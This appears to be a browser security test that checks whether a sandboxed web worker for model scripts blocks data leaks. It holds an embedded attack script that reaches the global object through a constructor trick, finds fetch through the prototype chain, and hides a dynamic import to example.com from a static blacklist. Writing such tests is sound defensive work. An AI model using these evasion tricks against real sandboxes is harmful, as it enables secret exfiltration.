async (page) => {
    const workerResponse = await page.request.get("http://127.0.0.1:3100/model-script-worker.js");
    const attemptedLeaks = [];
    const failedLeaks = [];
    const leakResponses = [];
    const onRequest = (request) => {
        if (request.url().includes("model-script-csp-leak")) attemptedLeaks.push(request.url());
    };
    const onRequestFailed = (request) => {
        if (request.url().includes("model-script-csp-leak")) failedLeaks.push({ url: request.url(), error: request.failure()?.errorText || "" });
    };
    const onResponse = (response) => {
        if (response.url().includes("model-script-csp-leak")) leakResponses.push({ url: response.url(), status: response.status() });
    };
    page.on("request", onRequest);
    page.on("requestfailed", onRequestFailed);
    page.on("response", onResponse);
    const attack = await page.evaluate(async () => {
        return await new Promise((resolve, reject) => {
            const worker = new Worker("/model-script-worker.js");
            const timer = setTimeout(() => {
                worker.terminate();
                reject(new Error("模型脚本浏览器安全测试超时"));
            }, 5000);
            worker.addEventListener("error", (event) => {
                clearTimeout(timer);
                worker.terminate();
                reject(new Error(event.message || "Worker 执行失败"));
            });
            worker.addEventListener("message", (event) => {
                const message = event.data || {};
                if (message.type !== "result" && message.type !== "error") return;
                clearTimeout(timer);
                worker.terminate();
                message.type === "result" ? resolve(message.result) : reject(new Error(message.message));
            });
            worker.postMessage({
                type: "run",
                runId: "browser-csp",
                script: `const root = [].filter["con" + "structor"]("return this")();
let owner = root;
while (owner && typeof owner.fetch !== "function") owner = Object.getPrototypeOf(owner);
let fetchResult = "missing";
try {
  await owner.fetch.call(root, "/?model-script-csp-leak=fetch");
  fetchResult = "allowed";
} catch (error) {
  fetchResult = error?.name || "blocked";
}
let importResult = "blocked";
try {
  await import/* 绕过静态黑名单 */("https://example.com/model-script-csp-leak=import.js");
  importResult = "allowed";
} catch (error) {
  importResult = error?.name || "blocked";
}
return { fetchResult, importResult, apiKey };`,
                args: { prompt: "secret-prompt", images: [], messages: [], params: {}, model: "test", baseUrl: "https://api.example.com", apiKey: "placeholder-only", systemPrompt: "" },
            });
        });
    });
    page.off("request", onRequest);
    page.off("requestfailed", onRequestFailed);
    page.off("response", onResponse);
    const result = {
        status: workerResponse.status(),
        csp: workerResponse.headers()["content-security-policy"],
        corp: workerResponse.headers()["cross-origin-resource-policy"],
        attemptedLeaks,
        failedLeaks,
        leakResponses,
        attack,
    };
    if (result.status !== 200 || !result.csp?.includes("connect-src 'none'")) throw new Error(`Worker CSP 响应头无效：${JSON.stringify(result)}`);
    if (result.attack.fetchResult === "allowed" || result.attack.importResult === "allowed" || result.attack.apiKey !== "placeholder-only") throw new Error(`Worker 绕过防护失败：${JSON.stringify(result)}`);
    if (result.leakResponses.length) throw new Error(`Worker 请求到达了外部响应：${JSON.stringify(result)}`);
    return result;
}
